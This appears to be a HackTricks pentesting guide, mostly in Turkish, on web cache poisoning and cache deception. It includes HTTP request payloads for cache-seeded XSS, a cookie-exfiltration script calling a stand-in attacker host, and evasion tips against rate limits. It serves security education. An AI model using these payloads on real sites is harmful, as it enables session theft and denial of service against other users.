# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## Fark

> **web cache poisoning ile web cache deception arasındaki fark nedir?**
>
> - In **web cache poisoning**, saldırgan uygulamanın cache'ine bazı kötü amaçlı içerikler depolanmasını sağlar ve bu içerik cache'den diğer uygulama kullanıcılarına sunulur.
> - In **web cache deception**, saldırgan uygulamanın cache'ine başka bir kullanıcıya ait bazı hassas içeriklerin depolanmasını sağlar ve daha sonra bu içeriği cache'den elde eder.

## Cache Poisoning

Cache poisoning, istemci tarafı cache'i manipüle ederek istemcilerin beklenmeyen, kısmi veya saldırganın kontrolünde olan kaynakları yüklemeye zorlanmasını hedefler. Etkinin kapsamı, etkilenen sayfanın popülaritesine bağlıdır; çünkü zehirlenmiş yanıt yalnızca cache'in kirlenme süresi boyunca sayfayı ziyaret eden kullanıcılara servis edilir.

Bir cache poisoning saldırısının uygulanması birkaç adımı içerir:

1. **Identification of Unkeyed Inputs**: Bunlar, bir isteğin cache'lenmesi için gerekli olmamasına rağmen sunucunun döndürdüğü yanıtı değiştirebilen parametrelerdir. Bu girdileri belirlemek önemlidir çünkü cache'i manipüle etmek için kullanılabilirler.
2. **Exploitation of the Unkeyed Inputs**: Unkeyed inputs belirlendikten sonra, bu parametreleri saldırgana fayda sağlayacak şekilde sunucu yanıtını değiştirmek için nasıl kötüye kullanacağınızı belirlemeniz gerekir.
3. **Ensuring the Poisoned Response is Cached**: Son adım, manipüle edilmiş yanıtın cache'e kaydedildiğinden emin olmaktır. Böylece cache zehirlendiği sürece etkilenen sayfaya erişen herhangi bir kullanıcı kirlenmiş yanıtı alır.

### Keşif: HTTP headers'ı kontrol et

Genellikle bir yanıt **cache'e kaydedildiğinde** bunu belirten bir **header** olur; hangi header'lara dikkat etmeniz gerektiğini bu yazıda kontrol edebilirsiniz: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Keşif: Hata kodlarının cache'lenmesi

Eğer bir yanıtın bir cache'de saklandığını düşünüyorsanız, **hatalı bir header ile istek göndermeyi** deneyebilir ve bunun **status code 400** ile cevaplandırılması gerekir. Daha sonra isteğe normal şekilde erişmeyi deneyin; eğer **yanıt 400 status code** ise, bu durumun zafiyetli olduğunu (ve hatta bir DoS gerçekleştirebileceğinizi) gösterir.

Daha fazla seçenek için şunlara bakabilirsiniz:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

Ancak, bazen bu tür status kodlarının **cache'lenmediğini** unutmayın; bu nedenle bu test her zaman güvenilir olmayabilir.

### Keşif: Unkeyed inputs'ı belirleme ve değerlendirme

[**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) kullanarak sayfanın **yanıtını değiştirebilecek** parametreleri ve header'ları **brute-force** edebilirsiniz. Örneğin, bir sayfa istemciye script'i oradan yüklemesini belirlemek için `X-Forwarded-For` header'ını kullanıyor olabilir:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Arka uç sunucusundan zararlı bir yanıt elde etme

Parametre/başlığı belirledikten sonra bunun nasıl temizlendiğini (sanitised) ve yanıtın neresinde yansıtıldığını veya başlığın yanıtı nasıl etkilediğini kontrol edin. Yine de bunu kötüye kullanabilir misiniz (ör. XSS gerçekleştirmek veya sizin kontrolünüzdeki bir JS kodunu yüklemek? DoS yapmak?...)

### Yanıtın cache'e alınmasını sağlama

Kötüye kullanılabilecek sayfayı, hangi parametre/başlık kullanılacağını ve bunu nasıl kötüye kullanacağınızı belirledikten sonra, sayfanın cache'e alınmasını sağlamanız gerekir. Cache'e almak istediğiniz kaynağa bağlı olarak bu biraz zaman alabilir; birkaç saniye boyunca denemeniz gerekebilir.

Cevaptaki header **`X-Cache`** çok faydalı olabilir çünkü istek cache'lenmediğinde değeri **`miss`**, cache'deyse **`hit`** olabilir.\
Header **`Cache-Control`** de bir kaynağın cachelenip cachelenmediğini ve bir sonraki cache zamanını öğrenmek için ilginçtir: `Cache-Control: public, max-age=1800`

Bir diğer ilginç header **`Vary`**'dir. Bu header genellikle normalde anahtar olmayan ek başlıkların bile **cache anahtarının parçası** olarak değerlendirildiğini **belirtmek** için kullanılır. Bu nedenle, eğer saldırgan hedeflediği kurbanın `User-Agent`'ini biliyorsa, o spesifik `User-Agent`'i kullanan kullanıcılar için cache'i poison edebilir.

Cache ile ilgili bir başka header ise **`Age`**'dir. Bu header, cismin proxy cache'te bulunduğu süreyi saniye cinsinden tanımlar.

Bir isteği cache'lerken kullandığınız başlıklara **dikkat edin** çünkü bazıları **beklenmedik şekilde** anahtar olarak **kullanılabilir** ve kurbanın **aynı başlığı kullanması** gerekecektir. Her zaman bir Cache Poisoning'i **farklı tarayıcılarla** test ederek çalışıp çalışmadığını kontrol edin.

## Sömürü Örnekleri

### En kolay örnek

`X-Forwarded-For` gibi bir header yanıtta sanitize edilmeden yansıtılıyorsa.\
Temel bir XSS payload gönderip cache'i poison ederek sayfaya erişen herkesin XSSlenmesini sağlayabilirsiniz:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Bu, `/en?region=uk` isteğini zehirleyecektir, `/en`'i değil_

### Cache poisoning to DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning through CDNs

**[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)**'de aşağıdaki basit senaryo açıklanıyor:

- CDN `/share/` altındaki her şeyi cache'leyecektir
- CDN `%2F..%2F`'yi decode veya normalize etmeyecektir; bu nedenle `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` gibi URL'ler **path traversal to access other sensitive locations that will be cached** için kullanılabilir
- Web sunucusu `%2F..%2F`'yi decode ve normalize edecek ve `/api/auth/session` ile cevap verecektir; bu yanıt **contains the auth token**.

### Using web cache poisoning to exploit cookie-handling vulnerabilities

Çerezler ayrıca bir sayfanın yanıtında yansıtılabilir. Örneğin bunu bir XSS tetiklemek için kötüye kullanabilirseniz, kötü amaçlı cache yanıtını yükleyen birden fazla istemcide XSS'i exploit edebilirsiniz.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Note that if the vulnerable cookie is very used by the users, regular requests will be cleaning the cache.

### Generating discrepancies with delimiters, normalization and dots <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Check:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning with path traversal to steal API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Bu writeup anlatıyor**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) nasıl `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` gibi bir URL ile bir OpenAI API key'in çalınabildiğini; çünkü `/share/*` ile eşleşen her şey, isteğin web sunucusuna ulaşana kadar Cloudflare tarafından URL normalleştirmesi yapılmadan cache'leniyordu.

This is also explained better in:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Bazen bir cache'i kötüye kullanabilmek için **exploit several unkeyed inputs** gerekir. Örneğin, `X-Forwarded-Host`'u sizin kontrolünüzdeki bir domaine ve `X-Forwarded-Scheme`'i `http` olarak ayarlarsanız bir **Open redirect** bulabilirsiniz. Eğer server tüm **HTTP** isteklerini **HTTPS**'e forward ediyor ve redirect için `X-Forwarded-Scheme` header'ını domain adı olarak kullanıyorsa, redirect ile sayfanın nereye yönlendirileceğini kontrol edebilirsiniz.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Exploiting kısıtlı `Vary`header

Eğer **`X-Host`** header'ının **JS resource yüklemek için domain adı** olarak kullanıldığını, ancak yanıt içindeki **`Vary`** header'ının **`User-Agent`**'ı gösterdiğini fark ederseniz, o zaman kurbanın `User-Agent`'ini sızdırmanın ve o `User-Agent`'i kullanarak önbelleği zehirlemenin bir yolunu bulmanız gerekir:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

URL'de ve body'de aynı isteği içeren bir GET isteği gönder. Eğer web server body'dekini kullanıyor ama cache server URL'dekini önbelleğe alıyorsa, o URL'ye erişen herkes aslında body'deki parametreyi kullanır. Github'ta James Kettle'ın bulduğu vuln gibi:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
There it a portswigger lab about this: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

Örneğin ruby sunucularında **parametreleri** ayırmak için karakter olarak **`;`** yerine **`&`** kullanılabiliyor. Bu, anahtarsız parametre değerlerini anahtarlı parametrelerin içine koymak ve bunlardan istifade etmek için kullanılabilir.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Burada [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning) ile nasıl saldırı yapılacağını öğrenin.

### Automated testing for Web Cache Poisoning

The [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) otomatik olarak web cache poisoning için test yapmakta kullanılabilir. Birçok farklı tekniği destekler ve yüksek derecede özelleştirilebilir.

Example usage: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

Bu gerçek dünya örüntüsü, başlığa dayalı bir yansıtma primitive'ini CDN/WAF davranışıyla birleştirerek diğer kullanıcılara servis edilen önbelleğe alınmış HTML'i güvenilir şekilde zehirlemeye olanak tanır:

- Ana HTML, güvenilmeyen bir istek başlığını (örn., `User-Agent`) çalıştırılabilir bağlama yansıtıyordu.
- CDN cache headerlarını kaldırdı fakat bir internal/origin cache mevcuttu. CDN ayrıca `.js` gibi statik uzantıyla biten istekleri otomatik olarak önbelleğe alıyordu; WAF ise statik varlıklar için yapılan GET'lere daha zayıf içerik denetimi uyguluyordu.
- İstek akışı anormallikleri, bir `.js` yoluna yapılan isteğin sonraki ana HTML için kullanılan cache anahtarını/çeşidini etkilemesine izin veriyordu; böylece başlık yansıtması yoluyla kullanıcılar arası XSS mümkün oluyordu.

Pratik tarif (popüler bir CDN/WAF üzerinde gözlemlendi):

1) Temiz bir IP'den (önceki itibar tabanlı düşürmelere sahip olmamaya dikkat ederek), tarayıcı veya Burp Proxy Match & Replace aracılığıyla kötü amaçlı bir `User-Agent` ayarlayın.
2) Burp Repeater'da iki isteklik bir grup hazırlayın ve "Send group in parallel" seçeneğini kullanın (single-packet mode en iyi sonucu verir):
- İlk istek: Aynı origin'de bir `.js` kaynak yoluna GET gönderin ve kötü amaçlı `User-Agent`'ınızı iletin.
- Hemen ardından: Ana sayfaya (`/`) GET gönderin.
3) CDN/WAF yönlendirme yarışı ve otomatik önbelleğe alınan `.js` genellikle zehirlenmiş bir önbelleğe alınmış HTML varyantını tohumlar; bu varyant daha sonra aynı cache anahtarı koşullarını paylaşan (örn. `User-Agent` gibi aynı `Vary` boyutları) diğer ziyaretçilere sunulur.

Example header payload (non-HttpOnly çerezleri sızdırmak için):
```
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Operasyonel ipuçları:

- Birçok CDN cache headers'ı gizler; poisoning yalnızca saatler süren yenileme döngülerinde görünebilir. Rate-limit veya reputation tetikleyicilerini tetiklemeden kaçınmak için birden fazla vantage IP kullanın ve throttle uygulayın.
- CDN'in kendi cloud'undan bir IP kullanmak bazen routing tutarlılığını iyileştirir.
- Eğer sıkı bir CSP varsa, reflection main HTML context içinde çalışıyorsa ve CSP inline execution'a izin veriyorsa veya context ile bypass edilebiliyorsa bu hâlâ işe yarar.

Impact:

- Eğer oturum cookie'leri `HttpOnly` değilse, zero-click ATO, poisoned HTML ile hizmet verilen tüm kullanıcılardan `document.cookie`'nin toplu exfiltrasyonuyla mümkün olabilir.

Defenses:

- Request headers'ı HTML'e yansıtmayı durdurun; kaçınılmazsa sıkı şekilde context-encode uygulayın. CDN ve origin cache policy'lerini hizalayın ve untrusted headers üzerinde varyasyon yapmaktan kaçının.
- WAF'in `.js` istekleri ve statik yollar üzerinde content inspection uyguladığından emin olun.
- Oturum cookie'lerinde `HttpOnly` (ve `Secure`, `SameSite`) ayarlarını yapın.

### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

A Sitecore‑specific pattern enables unauthenticated writes to the HtmlCache by abusing pre‑auth XAML handlers and AjaxScriptManager reflection. When the `Sitecore.Shell.Xaml.WebControl` handler is reached, an `xmlcontrol:GlobalHeader` (derived from `Sitecore.Web.UI.WebControl`) is available and the following reflective call is allowed:
```
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
Bu, saldırgan tarafından seçilen bir cache key altında rastgele HTML yazar; cache key'ler bilindiğinde hassas poisoning yapılmasını sağlar.

For full details (cache key construction, ItemService enumeration and a chained post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## Zafiyetli Örnekler

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS URL içindeki fragment'i temizlemeden iletti ve cache key'i yalnızca host, path ve query kullanarak oluşturdu (fragment'i görmezden gelerek). Bu nedenle `/#/../?r=javascript:alert(1)` isteği backend'e `/#/../?r=javascript:alert(1)` olarak gönderildi ve cache key içinde payload yoktu; sadece host, path ve query vardı.

### GitHub CP-DoS

content-type header'ına kötü bir değer gönderilmesi 405 önbelleğe alınmış bir yanıtı tetikliyordu. Cache key cookie'yi içeriyordu, bu yüzden yalnızca kimliksiz kullanıcıları (unauth users) hedeflemek mümkün oldu.

### GitLab + GCP CP-DoS

GitLab statik içeriği depolamak için GCP buckets kullanır. GCP Buckets **`x-http-method-override`** header'ını destekler. Bu yüzden `x-http-method-override: HEAD` header'ı gönderip cache'i boş bir response body döndürecek şekilde poison etmek mümkün oldu. `PURGE` metodunu da destekleyebiliyordu.

### Rack Middleware (Ruby on Rails)

Ruby on Rails uygulamalarında sıklıkla Rack middleware kullanılır. Rack kodunun amacı **`x-forwarded-scheme`** header'ının değerini alıp isteğin scheme'i olarak ayarlamaktır. `x-forwarded-scheme: http` header'ı gönderildiğinde aynı konuma 301 redirect oluşur ve bu kaynak için potansiyel bir Denial of Service (DoS) yaratabilir. Ayrıca uygulama `X-forwarded-host` header'ını dikkate alıp kullanıcıları belirtilen host'a yönlendirebilir. Bu davranış, JavaScript dosyalarının saldırganın sunucusundan yüklenmesine yol açarak güvenlik riski oluşturabilir.

### 403 and Storage Buckets

Cloudflare eskiden 403 yanıtlarını cache'liyordu. Yanlış Authorization header'ları ile S3 veya Azure Storage Blobs'a erişmeye çalışmak 403 yanıtı üretir ve bu yanıt önbelleğe alınırdı. Cloudflare artık 403 yanıtlarını cachelemeyi durdurmuş olsa da, bu davranış diğer proxy servislerinde hâlâ mevcut olabilir.

### Injecting Keyed Parameters

Cache'ler genellikle cache key'inde belirli GET parametrelerini dahil eder. Örneğin, Fastly'nin Varnish'i isteklerdeki `size` parametresini cacheliyordu. Ancak parametrenin URL-encoded bir versiyonu (örn. `siz%65`) yanlış bir değerle de gönderilirse, cache key doğru `size` parametresini kullanarak oluşturulurdu. Fakat backend URL-encoded parametrenin değerini işlerdi. İkinci `size` parametresini URL-encode etmek cache tarafından atlanmasına, ancak backend tarafından kullanılmasına yol açtı. Bu parametreye 0 değeri atanması cachelenebilir bir 400 Bad Request hatası ile sonuçlandı.

### User Agent Rules

Bazı geliştiriciler, FFUF veya Nuclei gibi yüksek trafikli araçların user-agent'larıyla eşleşen istekleri sunucu yükünü yönetmek için engeller. Ironik olarak, bu yaklaşım cache poisoning ve DoS gibi zafiyetlere yol açabilir.

### Illegal Header Fields

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) header isimlerinde kabul edilebilir karakterleri belirtir. Belirtilen **tchar** aralığı dışındaki karakterleri içeren header'lar idealde 400 Bad Request yanıtı tetiklemelidir. Pratikte sunucular her zaman bu standarda uymuyor. Kayda değer bir örnek Akamai; geçersiz karakterler içeren header'ları iletir ve `cache-control` header'ı yoksa herhangi bir 400 hatasını cacheler. Örneğin `\` gibi yasadışı bir karakter içeren bir header göndermek cachelenebilir bir 400 Bad Request hatasına neden olacak şekilde kullanılabilir bulunmuştur.

### Finding new headers

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

Cache Deception'ın amacı, istemcilerin **cache tarafından kaydedilecek** kaynakları **duyarlı bilgileriyle birlikte yüklemesini sağlamak**tır.

Öncelikle şunu unutmayın: `.css`, `.js`, `.png` vb. gibi **uzantılar** genellikle **cache'de saklanacak** şekilde **yapılandırılır.** Bu nedenle `www.example.com/profile.php/nonexistent.js` adresine erişirseniz, cache büyük olasılıkla yanıtı uzantıyı `.js` olarak gördüğü için saklayacaktır. Ancak **uygulama**, _www.example.com/profile.php_ içinde saklı olan **duyarlı** kullanıcı içeriklerini yanıtlıyorsa, bu içerikleri diğer kullanıcılardan **çalabilirsiniz**.

Test edilecek diğer şeyler:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Daha az bilinen uzantılar kullanın, örn._ `.avif`

Başka çok açıklayıcı bir örnek şu write-up'ta bulunuyor: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
Örnekte, _http://www.example.com/home.php/non-existent.css_ gibi olmayan bir sayfayı yüklediğinizde _http://www.example.com/home.php_ içeriğinin (**kullanıcının duyarlı bilgileriyle birlikte**) döndürüleceği ve cache sunucusunun sonucu saklayacağı açıklanıyor.\
Ardından, **saldırgan** kendi tarayıcısında _http://www.example.com/home.php/non-existent.css_ adresine erişip, daha önce bu sayfayı ziyaret eden kullanıcıların **gizli bilgilerini** gözlemleyebilir.

Burada dikkat edilmesi gereken, **cache proxy**'nin dosyaları mime-type değil, dosya **uzantısına** (_.css_) göre **cache**leyecek şekilde **yapılandırılmış** olmasıdır. Örnekte _http://www.example.com/home.php/non-existent.css_ için `text/html` content-type dönecek ve `text/css` mime type olmayacaktır.

Buradan, HTTP Request Smuggling'i kötüye kullanarak Cache Deceptions saldırılarının nasıl gerçekleştirileceğini öğrenin: [ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

## Otomatik Araçlar

- [**toxicache**](https://github.com/xhzeem/toxicache): Golang ile yazılmış, bir URL listesindeki web cache poisoning zafiyetlerini bulmak ve birden fazla injection tekniğini test etmek için scanner.

## Referanslar

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)


{{#include ../../banners/hacktricks-training.md}}
